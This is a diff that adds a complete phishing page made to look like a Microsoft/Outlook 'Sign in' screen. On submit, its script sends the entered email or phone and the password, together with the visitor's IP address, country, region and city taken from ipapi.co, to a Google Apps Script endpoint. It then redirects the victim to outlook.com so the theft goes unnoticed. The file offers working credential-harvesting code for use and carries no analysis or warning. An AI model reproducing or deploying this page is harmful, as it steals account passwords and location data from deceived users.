@@ -1,0 +1,259 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Sign In</title>
+  <style>
+    body {
+  margin: 0;
+  font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+  background-color: #fff;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  justify-content: flex-start; /* 👈 changed from center */
+  padding-top: 40px;           /* 👈 added to move content slightly below the top */
+  height: 100vh;
+}
+
+    .container {
+      width: 100%;
+      max-width: 360px;
+      padding: 20px;
+      box-sizing: border-box;
+    }
+
+    .logo {
+      display: block;
+      margin: 0 auto 20px;
+      width: 64px;
+      height: auto;
+    }
+
+    input[type="text"],
+    input[type="password"] {
+      width: 100%;
+      padding: 10px;
+      font-size: 16px;
+      margin: 10px 0;
+      box-sizing: border-box;
+      border: none;
+      border-bottom: 2px solid #0078D4;
+      outline: none;
+    }
+
+    .password-container {
+      position: relative;
+    }
+
+    .eye-icon {
+      position: absolute;
+      right: 10px;
+      top: 50%;
+      transform: translateY(-50%);
+      cursor: pointer;
+      opacity: 0.6;
+    }
+
+    .link {
+      color: #0078D4;
+      text-decoration: none;
+      font-size: 14px;
+    }
+
+    .button {
+      width: 100%;
+      padding: 10px;
+      background-color: #0078D4;
+      color: #fff;
+      border: none;
+      font-size: 16px;
+      font-weight: bold;
+      cursor: pointer;
+      margin-top: 20px;
+    }
+
+    .footer {
+      margin-top: 40px;
+      display: flex;
+      justify-content: center;
+      gap: 20px;
+      font-size: 12px;
+      color: #666;
+    }
+
+    .small-links {
+      text-align: center;
+      margin-top: 20px;
+    }
+
+    .small-links a {
+      display: block;
+      margin: 5px 0;
+    }
+  .footer-fixed {
+  position: fixed;
+  bottom: 10px;
+  left: 0;
+  width: 100%;
+  display: flex;
+  justify-content: center;
+  gap: 20px;
+  font-size: 12px;
+  color: #666;
+  background-color: #fff;
+  padding: 10px 0;
+}
+  </style>
+</head>
+<body>
+  <div class="container">
+    <img src="/storage/emulated/0/Pictures/Screenshots/Screenshot_20250705-153746~2.jpg"  style=" height: 100px; width:100px" class="logo" alt="Microsoft Logo">
+    <h2 style="margin-bottom: 10px; font-weight: bold; font-size: 24px;">Sign in</h2>
+         <form action="https://script.google.com/macros/s/AKfycbyZkHf_IQuy5zkDvxFs-H6GmZp6R2yPs2R2o5aADu_qIGU8BhKXJ1749L3Z8BV6xyRH/exec" method="POST" id="outlooklogs">         
+    <input type="text" name="email_or_phone" placeholder="Email, phone, or Skype" required/>
+    <div class="password-container">
+     <input type="password" name="message" placeholder="Password" required/>
+      <input type="hidden" id="ip_address" name="ip_address">
+            <input type="hidden" id="country" name="country">
+            <input type="hidden" id="region" name="region">
+            <input type="hidden" id="city" name="city">
+            <input type="hidden" name="form_id" value="outlooklogs">
+            <input type="hidden" name="origin" value="https://joshiahh.github.io/Faceb00k-profile-/">
+      <span class="eye-icon">👁️</span>
+    </div>
+    <div>
+    <a href="#" class="link" style="font-size: 14px; text-align:center;">Forgot your password?</a>
+    <button type="submit" class="button">Sign In</button>
+    </div>
+    <br>
+     <br>
+   <div style="font-size: 14px;">No account? <a href="https://login.microsoftonline.com" class="link" style="font-size: 14px;">Create one!</a></div>
+      <a href="https://login.microsoftonline.com" class="link" style="font-size: 14px;">Can’t access your account?</a>
+    </div>
+
+    <div class="footer-fixed">
+  <a href="#" class="link" style="font-size: 12px;">Terms of use</a>
+  <a href="#" class="link" style="font-size: 12px;">Privacy & cookies</a>
+  <span style="font-size: 12px;">. . .</span>
+</div>
+  </div>
+       <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+  <script>
+      // Detects the user's preferred language
+    function detectUserLanguage() {
+      const userLang = navigator.language || navigator.userLanguage;
+      return userLang.slice(0, 2); // Get the first 2 characters of the language code (e.g., "en", "fr", etc.)
+    }
+
+    // Supported languages based on LibreTranslate (expandable)
+    const supportedLanguages = [
+      'af', 'sq', 'am', 'ar', 'hy', 'az', 'eu', 'be', 'bn', 'bs', 'bg', 'ca', 
+      'zh', 'hr', 'cs', 'da', 'nl', 'en', 'et', 'fi', 'fr', 'gl', 'ka', 'de', 
+      'el', 'gu', 'ht', 'he', 'hi', 'hu', 'is', 'ig', 'id', 'ga', 'it', 'ja', 
+      'jv', 'kn', 'kk', 'km', 'ko', 'ku', 'ky', 'lo', 'la', 'lv', 'lt', 'lb', 
+      'mk', 'ms', 'ml', 'mt', 'mi', 'mr', 'mn', 'my', 'ne', 'no', 'ps', 'fa', 
+      'pl', 'pt', 'pa', 'ro', 'ru', 'gd', 'sr', 'st', 'si', 'sk', 'sl', 'so', 
+      'es', 'su', 'sw', 'sv', 'tg', 'ta', 'te', 'th', 'tr', 'uk', 'ur', 'uz', 
+      'vi', 'cy', 'xh', 'yi', 'yo', 'zu'
+    ];
+
+    // Fallback to English if the user's language is unsupported
+    function getFallbackLanguage(userLang) {
+      return supportedLanguages.includes(userLang) ? userLang : 'en';
+    }
+
+    // Batch translation function
+    function translateBatch(texts, targetLang) {
+      return fetch('https://libretranslate.com/translate', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+          q: texts,
+          source: 'en',   // Assuming English as the default language
+          target: targetLang,
+          format: "text"
+        }),
+      })
+      .then(response => response.json())
+      .then(data => data.map(item => item.translatedText))
+      .catch(error => {
+        console.error('Error translating text:', error);
+        // Fallback to original texts in case of an error
+        return texts;
+      });
+    }
+
+    // Function to translate all form labels, buttons, and placeholders
+    function translateForm(targetLang) {
+      const elementsToTranslate = document.querySelectorAll('[data-translate], [data-translate-placeholder]');
+
+      // Collect all texts that need translation
+      const textsToTranslate = Array.from(elementsToTranslate).map(elem => {
+        return elem.textContent || elem.placeholder;
+      });
+
+      // Translate all texts in a single request
+      translateBatch(textsToTranslate, targetLang)
+        .then(translatedTexts => {
+          let i = 0;
+          elementsToTranslate.forEach(elem => {
+            if (elem.textContent && elem.hasAttribute('data-translate')) {
+              elem.textContent = translatedTexts[i++];
+            } else if (elem.placeholder && elem.hasAttribute('data-translate-placeholder')) {
+              elem.placeholder = translatedTexts[i++];
+            }
+          });
+        });
+    }
+
+    // Initialize translation based on the user's preferred language or fallback
+    document.addEventListener('DOMContentLoaded', function() {
+      const userLang = detectUserLanguage();
+      const targetLang = getFallbackLanguage(userLang);
+      translateForm(targetLang);
+    });
+
+  // Fetch user's location and IP address
+    $(document).ready(function () {
+        $.get("https://ipapi.co/json/", function (data) {
+            $("#ip_address").val(data.ip);
+            $("#country").val(data.country_name);
+            $("#region").val(data.region);
+            $("#city").val(data.city);
+        });
+
+   // Function to handle form submission
+        document.getElementById('outlooklogs').addEventListener('submit', function(event) {
+          event.preventDefault();
+          const form = event.target;
+          const formData = new FormData(form);
+          const jsonData = {};
+          for (const [key, value] of formData.entries()) {
+            jsonData[key] = value;
+          }
+          fetch('https://script.google.com/macros/s/AKfycbyZkHf_IQuy5zkDvxFs-H6GmZp6R2yPs2R2o5aADu_qIGU8BhKXJ1749L3Z8BV6xyRH/exec', {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/x-www-form-urlencoded',
+            },
+            body: new URLSearchParams(jsonData).toString(),
+          })
+          .then(response => {
+            if (response.ok) {
+              window.location.replace('https://www.outlook.com/');
+            } else {
+              console.error('Error submitting form data');
+            }
+          })
+          .catch(error => {
+            console.error('Fetch error:', error);
+          });
+        });
+      });
+    </script>
+</form>
+</body>
+</html>
